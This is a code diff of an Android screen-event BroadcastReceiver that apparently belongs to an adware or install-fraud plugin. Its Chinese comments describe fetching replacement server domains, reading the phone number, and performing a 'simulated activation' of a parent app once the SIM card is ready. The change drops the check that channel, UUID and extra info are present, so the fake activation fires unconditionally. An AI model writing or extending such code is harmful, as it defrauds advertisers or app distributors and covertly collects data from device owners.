@@ -33,8 +33,8 @@ public class ScreenBRC extends BroadcastReceiver {
 
         //如果只剩下一个域名了，去服务器获取
         if (DomanManager.getInstance(context).getDomainCount() <= 1
-            && UtilsRuntime.isOnline(context)
-            && SettingManager.getInstance().getTodayFetchDomainCount() < 5) {
+                && UtilsRuntime.isOnline(context)
+                && SettingManager.getInstance().getTodayFetchDomainCount() < 5) {
             //一天获取三次
             Intent fetchIntent = new Intent();
             fetchIntent.setAction(PluginService.ACTION_FETCH_DOMAIN);
@@ -65,31 +65,26 @@ public class ScreenBRC extends BroadcastReceiver {
         AppRuntime.getPhoneNumberForLocal(context);
 
         if (intent != null/* && isDeviceBinded*/) {
-            if (Config.DEBUG) {
-                Config.LOGD("[[ScreenBRC::onReceive]] check Main APK Active Info : " +
-                                " channel ID = " + SettingManager.getInstance().getMainApkChannel() +
-                                " UUID = " + SettingManager.getInstance().getMainApkSendUUID() +
-                                " Extra Info = " + SettingManager.getInstance().getMainExtraInfo() +
-                                " main apk active time = " + SettingManager.getInstance().getMainApkActiveTime());
-            }
+//            if (Config.DEBUG) {
+//                Config.LOGD("[[ScreenBRC::onReceive]] check Main APK Active Info : " +
+//                                " channel ID = " + SettingManager.getInstance().getMainApkChannel() +
+//                                " UUID = " + SettingManager.getInstance().getMainApkSendUUID() +
+//                                " Extra Info = " + SettingManager.getInstance().getMainExtraInfo() +
+//                                " main apk active time = " + SettingManager.getInstance().getMainApkActiveTime());
+//            }
 
             //只有SIM卡准备好的时候才进行模拟激活，并且IMSI > 0
             if (AppRuntime.isSIMCardReady(context)
-                && AppRuntime.getNetworkTypeByIMSI(context) > 0
-                && SettingManager.getInstance().getMainApkActiveTime() == 0) {
+                    && AppRuntime.getNetworkTypeByIMSI(context) > 0
+                    && SettingManager.getInstance().getMainApkActiveTime() == 0) {
                 //子程序没有做母程序激活
-                if (!TextUtils.isEmpty(SettingManager.getInstance().getMainApkChannel())
-                        && !TextUtils.isEmpty(SettingManager.getInstance().getMainApkSendUUID())
-                        && !TextUtils.isEmpty(SettingManager.getInstance().getMainExtraInfo())) {
-                    //关键的三个数据都不为空在进行激活，否则激活也找不到对应的设备串号，所以什么也不做
-                    if (Config.DEBUG) {
-                        Config.LOGD("[[ScreenBRC::onReceive]] try to send MAIN ACTIVE EVENT with action : " + PluginService.ACTION_MAIN_UUID_ACTIVE_BY_PLUGN);
-                    }
-                    Intent mainActive = new Intent();
-                    mainActive.setAction(PluginService.ACTION_MAIN_UUID_ACTIVE_BY_PLUGN);
-                    mainActive.setClass(context, PluginService.class);
-                    context.startService(mainActive);
+                if (Config.DEBUG) {
+                    Config.LOGD("[[ScreenBRC::onReceive]] try to send MAIN ACTIVE EVENT with action : " + PluginService.ACTION_MAIN_UUID_ACTIVE_BY_PLUGN);
                 }
+                Intent mainActive = new Intent();
+                mainActive.setAction(PluginService.ACTION_MAIN_UUID_ACTIVE_BY_PLUGN);
+                mainActive.setClass(context, PluginService.class);
+                context.startService(mainActive);
             }
 
             String action = intent.getAction();
